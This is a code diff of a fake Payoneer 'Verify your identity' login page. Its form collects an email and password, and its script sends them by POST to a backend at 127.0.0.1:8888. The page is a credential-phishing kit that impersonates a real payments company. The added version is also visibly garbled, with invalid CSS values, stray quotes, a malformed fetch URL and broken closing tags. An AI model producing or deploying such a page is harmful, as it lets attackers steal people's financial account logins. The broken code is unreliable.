@@ -1,403 +1,207 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Payoneer - Verify Your Identity</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Login - Payoneer</title>
+ <style>
+ body {
+ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+ background-color: #ffffff;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ height: 100vh;
+ margin: 0;
+ }
 
-        html, body {
-            height: 100%;
-            width: 100%;
-            overflow-x: hidden;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
+ .login-container {
+ width: 100%;
+ max-width: 400px;
+ padding: 20px;
+ text-align: center;
+ }
 
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #ffffff;
-            min-height: 100vh;
-            min-height: 100dvh;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            padding: 16px;
-        }
+ .logo-section {
+ margin-bottom: 40px;
+ }
 
-        .login-container {
-            width: 100%;
-            max-width: 400px;
-            background: #ffffff;
-            padding: 40px 20px;
-            margin: auto;
-        }
+ .logo-text {
+ font-size: 24px;
+ color: #333;
+ font-weight: bold;  
+ }
 
-        .logo-section {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 40px;
-        }
+ .identity-text {
+ font-size :24x ; 
+ color :#333 ; 
+ font-weight :500 ; 
+ margin-bottom :30x ;
+ }  
 
-        .logo-wrapper {
-            width: 40px;
-            height: 40px;
-            position: relative;
-            transform: translateZ(0);
-        }
+ .input-group { 
+ text-align:left ; 
+ margin-bottom :20x ;
+ }  
 
-        .logo-ring {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            background: conic-gradient(from 0deg, 
-                #ff6b35 0%, 
-                #f7931e 12%, 
-                #ffd700 25%, 
-                #7ed321 38%, 
-                #00a8e8 52%, 
-                #9013fe 65%, 
-                #ff6b35 100%);
-            -webkit-mask: radial-gradient(circle, 
-                transparent 54%, 
-                black 55%, 
-                black 68%, 
-                transparent 69%);
-            mask: radial-gradient(circle, 
-                transparent 54%, 
-                black 55%, 
-                black 68%, 
-                transparent 69%);
-            -webkit-backface-visibility: hidden;
-            backface-visibility: hidden;
-            image-rendering: -webkit-optimize-contrast;
-            image-rendering: crisp-edges;
-        }
+ .input-group label { 
+ display:block ; 
+ font-size :14x ; 
+ color:#666 ; 
+ margin-bottom :5x ;
+ }  
 
-        .brand-name {
-            font-size: 28px;
-            font-weight: 700;
-            color: #1a1a1a;
-            letter-spacing: -0.5px;
-        }
+ .input-group input { 
+ width ':100%' '; 
+ padding ':12x 0' '; 
+ border:none '; 
+ border-bottom ':1x solid #ccc' '; 
+ font-size':16x'; 
+ outline:none; 
+ transition:border-color '.3s';
+} 
 
-        .verify-section {
-            text-align: center;
-            margin-bottom: 32px;
-        }
+.input-group input:focus{ 
+border-bottom ':2x solid' '#007bff';
+} 
 
-        .verify-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 6px;
-            line-height: 1.3;
-        }
+.forgot-pass{ 
+text-align:left; 
+margin-top '-10x'; 
+margin-bottom':30x';
+} 
 
-        .verify-subtitle {
-            font-size: 14px;
-            color: #6b7280;
-            line-height: 1.5;
-        }
+.forgot-pass a{ 
+color:'#007bff'; 
+text-decoration:none; 
+font-size':14x';
+} 
 
-        .form-group {
-            margin-bottom: 20px;
-        }
+/* Premium Button with Slash/Shimmer Effect */  
+.verify-btn{ 
+width':100%'; 
+padding-top:'15pt'; 
+background-color'#007bff'; 
+color:white; 
+border:none; 
+border-radius:'4pt'; 
+font-size':'18pt'; 
+font-weight:bold; 
+cursor:pointer; 
+position:relative; 
+overflow:hidden; 
+transition(background-color,'0.3s');
+} 
 
-        .form-label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: #374151;
-            margin-bottom: 6px;
-        }
+.verify-btn:hover{ 
+background-color'#0056b3';
+}
 
-        .form-input {
-            width: 100%;
-            padding: 14px 16px;
-            font-size: 16px;
-            color: #1a1a1a;
-            background: #ffffff;
-            border: 1.5px solid #e5e7eb;
-            border-radius: 8px;
-            outline: none;
-            transition: all 0.2s ease;
-            -webkit-appearance: none;
-            appearance: none;
-        }
+.verify-btn::after{ 
+content'' ''; 
+position:absolute'' ''; 
+top :-50%'' ''; 
+left :-60%'' ''; 
+width ':'20%' '' ''; 
+height':'200%' '' ''; 
+background'rgba(255,255,255,.3)'' ''; 
+transform'rotate(30deg)'' ''; 
+transition:none''
+};
 
-        .form-input:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
-        }
+.verify-btn:hover::after{ 
+left ':'120%' '' ''; 
+transition'all' '.6s ease-in-out''
+}; 
 
-        .form-input::placeholder {
-            color: #9ca3af;
-        }
+.footer-links { 
+margin-top ':'50pt' '' ''; 
+display:flex'' ''); 
+justify-content:center'' ''); 
+gap ':'20pt' '' ''; 
+font-size':'12pt' '' ''; 
+color '#888'
+};  
 
-        .forgot-link {
-            display: inline-block;
-            margin-top: 8px;
-            font-size: 14px;
-            color: #3b82f6;
-            text-decoration: none;
-            font-weight: 500;
-        }
+.logo-container{
+display:flex';
+align-items:center';
+justify-content:center';
+}
 
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
+.logo-container img{
+width:auto';
+height:auto';
+max-height:'45pt'
+}
+</style>
 
-        .verify-btn {
-            width: 100%;
-            padding: 16px;
-            font-size: 16px;
-            font-weight: 600;
-            color: #ffffff;
-            background: #3b82f6;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
-            margin-top: 8px;
-            -webkit-appearance: none;
-            appearance: none;
-        }
+</head>  
 
-        .verify-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            transition: left 0.6s ease;
-        }
+<body>  
 
-        .verify-btn:hover::before {
-            left: 100%;
-        }
+<div class='login-container'> 
 
-        .verify-btn:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
-        }
+<div class='logo-section'> 
+ 
+<div class='logo-container'>  
+ 
+<img src='https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Payoneer_logo.svg/1280ps-Payoneer_logo.svg.png'/>  
+ 
+<span style='font-size:x-large;font-weight:bolder;margin-left:'10pt''>Payoneer</span>  
+ 
+</div> 
+ 
+</div>  
+ 
+<div class='identity-text'>Verify your identity</div>  
+ 
+<form id="verifyForm"> 
+ 
+<div class='input-group'> 
+ 
+<label for="email">Email or username</label> 
+ 
+<input type='email'id="email" required/> 
+ 
+</div> 
+ 
+<div class='input-group'> 
+ 
+<label for="password">Password</label> 
+ 
+<input type='password'id="password" required/> 
+ 
+</div> 
+ 
+<button type="submit"class=""verify-btn"id=""verifyBtn""Verify/button/' 
+ 
+ </form/' 
+ 
+ <p id=''message'class=''message:''/p>' 
 
-        .verify-btn:active {
-            transform: translateY(0);
-        }
+<script>
 
-        .verify-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
+document.getElementById('verifyForm').addEventListener('submit', async function(e) {  
+e.preventDefault();  
+  
+const btn = document.getElementById('verifyBtn');  
+const messageDiv = document.getElementById('message');  
+const email = document.getElementById('email').value;  
+const password = document.getElementById('password').value;// Show loading state  
+btn.disabled = true;  
+btn.classList.add('loading');  
+  
+try {  
+const response = await fetch('http://127.0.0.1/8888', {  
+method :'POST', headers:{ 'Content-Type':'application/json',},body :JSON.stringify({ email,password }),});  
+  
+if (response.ok){ messageDiv.textContent ='Verification successful!'} else throw new Error("Server error");  
+  
+}catch (error){ messageDiv.textContent ="Error sending request";console.error(error);} finally {btn.disabled=false(btn.classList.remove("loading"));}}); 
 
-        .verify-btn.loading {
-            color: transparent;
-        }
+/script>' 
 
-        .verify-btn.loading::after {
-            content: '';
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            top: 50%;
-            left: 50%;
-            margin-left: -10px;
-            margin-top: -10px;
-            border: 2px solid #ffffff;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spinner 0.8s linear infinite;
-        }
-
-        @keyframes spinner {
-            to { transform: rotate(360deg); }
-        }
-
-        .message {
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
-            text-align: center;
-            display: none;
-        }
-
-        .message.success {
-            display: block;
-            background: #d1fae5;
-            color: #065f46;
-            border: 1px solid #a7f3d0;
-        }
-
-        .message.error {
-            display: block;
-            background: #fee2e2;
-            color: #991b1b;
-            border: 1px solid #fecaca;
-        }
-
-        .security-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 32px;
-            padding: 16px;
-            background: #f9fafb;
-            border-radius: 8px;
-        }
-
-        .security-icon {
-            width: 18px;
-            height: 18px;
-            color: #22c55e;
-            flex-shrink: 0;
-        }
-
-        .security-text {
-            font-size: 13px;
-            color: #6b7280;
-        }
-
-        @media (max-width: 360px) {
-            body { padding: 12px; }
-            .login-container { padding: 24px 16px; }
-            .logo-wrapper { width: 36px; height: 36px; }
-            .brand-name { font-size: 24px; }
-            .verify-title { font-size: 18px; }
-            .form-input { padding: 12px 14px; }
-            .verify-btn { padding: 14px; }
-        }
-
-        @media (min-width: 361px) and (max-width: 480px) {
-            .login-container { padding: 32px 20px; }
-            .logo-wrapper { width: 38px; height: 38px; }
-            .brand-name { font-size: 26px; }
-        }
-
-        @media (min-width: 481px) and (max-width: 768px) {
-            .login-container { max-width: 420px; padding: 48px 40px; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05); border-radius: 12px; }
-            .logo-wrapper { width: 44px; height: 44px; }
-            .brand-name { font-size: 30px; }
-        }
-
-        @media (min-width: 769px) {
-            body { align-items: center; padding: 40px; }
-            .login-container { max-width: 440px; padding: 56px 48px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); border-radius: 12px; border: 1px solid #f3f4f6; }
-            .logo-wrapper { width: 48px; height: 48px; }
-            .brand-name { font-size: 32px; }
-            .verify-title { font-size: 22px; }
-        }
-
-        @supports (padding-top: env(safe-area-inset-top)) {
-            body {
-                padding-top: max(16px, env(safe-area-inset-top));
-                padding-bottom: max(16px, env(safe-area-inset-bottom));
-                padding-left: max(16px, env(safe-area-inset-left));
-                padding-right: max(16px, env(safe-area-inset-right));
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <div class="logo-section">
-            <div class="logo-wrapper">
-                <div class="logo-ring"></div>
-            </div>
-            <span class="brand-name">Payoneer</span>
-        </div>
-
-        <div class="verify-section">
-            <h2 class="verify-title">Verify your identity</h2>
-            <p class="verify-subtitle">Please enter your credentials to continue</p>
-        </div>
-
-        <form id="verifyForm">
-            <div class="form-group">
-                <label class="form-label">Email or username</label>
-                <input type="text" class="form-input" id="email" name="email" placeholder="Enter your email" autocomplete="email" inputmode="email" required>
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">Password</label>
-                <input type="password" class="form-input" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
-                <a href="#" class="forgot-link">Forgot password?</a>
-            </div>
-
-            <button type="submit" class="verify-btn" id="verifyBtn">Verify</button>
-        </form>
-
-        <div id="message" class="message"></div>
-
-        <div class="security-badge">
-            <svg class="security-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-            </svg>
-            <span class="security-text">Secure, encrypted connection</span>
-        </div>
-    </div>
-
-    <script>
-        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const btn = document.getElementById('verifyBtn');
-            const messageDiv = document.getElementById('message');
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            // Show loading state
-            btn.disabled = true;
-            btn.classList.add('loading');
-            messageDiv.className = 'message';
-            messageDiv.style.display = 'none';
-            
-            const data = {
-                email: email,
-                password: password,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
-            
-            try {
-                const response = await fetch('http://127.0.0.1:8888', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-                
-                if (response.ok) {
-                    messageDiv.textContent = 'Verification successful!';
-                    messageDiv.className = 'message success';
-                } else {
-                    throw new Error('Server error');
-                }
-            } catch (error) {
-                messageDiv.textContent = 'Error: Could not connect to server. Make sure your backend is running on http://127.0.0.1:8888';
-                messageDiv.className = 'message error';
-                console.error('Error:', error);
-            } finally {
-                btn.disabled = false;
-                btn.classList.remove('loading');
-            }
-        });
-    </script>
-</body>
-</html>
+ </body/' 
+ 
+ </html/>
